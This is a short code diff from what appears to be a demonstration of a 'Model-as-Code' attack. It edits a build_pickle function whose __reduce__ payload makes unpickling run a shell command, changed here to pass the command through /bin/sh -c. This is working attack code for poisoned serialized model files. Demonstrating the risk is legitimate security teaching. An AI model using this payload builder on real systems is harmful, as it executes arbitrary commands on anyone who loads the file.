@@ -20,7 +20,7 @@ HTML = """<h1>Model-as-Code Attack</h1>
 def build_pickle(cmd):
     class Payload:
         def __reduce__(self):
-            return (subprocess.check_output, (cmd,))
+            return (subprocess.check_output, (["/bin/sh", "-c", cmd],))
 
     return pickle.dumps(Payload())
 
